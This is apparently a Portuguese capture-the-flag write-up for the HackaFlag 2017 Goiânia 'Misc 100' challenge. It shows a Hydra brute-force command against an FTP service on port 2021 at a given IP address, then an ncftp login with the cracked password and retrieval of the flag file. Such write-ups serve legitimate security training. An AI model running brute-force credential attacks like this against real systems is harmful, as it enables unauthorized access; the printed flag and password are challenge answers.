---
title: HackaFlag 2017 - Goiania MISC 100
date: 2017-03-09 09:36:00 Z
---

**Category:** Misc
**Points:** 100
**Description:**

>FTP
O administrador é o usuario, preocupado com a segurança, 
sabe os riscos de deixar os serviços como por exemplo 
ftp e ssh desatualizados, por vezes, senhas fracas tambem 
são grandes portas de entrada. IP: 45.55.184.240

Autor: @chucky


# Write-up:


Após um SCAN, detectamos o FTP na porta: 2021


Vamos usar Brute-force e encontra essa senha, para isso
você pode usar o Hydra ou o Nozzlr (https://github.com/intrd/nozzlr)

```bash
# hydra -l administrador -P senhas.txt 45.55.184.240 ftp -s 2021
```

Descobrindo a senha, logue no FTP:

```bash
# ncftp -u usuario 45.55.184.240 -P 2021

Password requested by 45.55.184.240 for user "usuario".

    Password required for usuario

Password: 123123

User usuario logged in
ncftp /home/usuario > ls
.bash_history   .bash_logout    .bashrc         flag.txt        .profile        .viminfo
ncftp /home/usuario > get flag.txt 
flag.txt:                                        30,00/ 29,00 B  172,05 B/s   
```

```bash
# cat flag.txt

HACKAFLAG{Eu_MaNJo_DoS_BrUt}
```
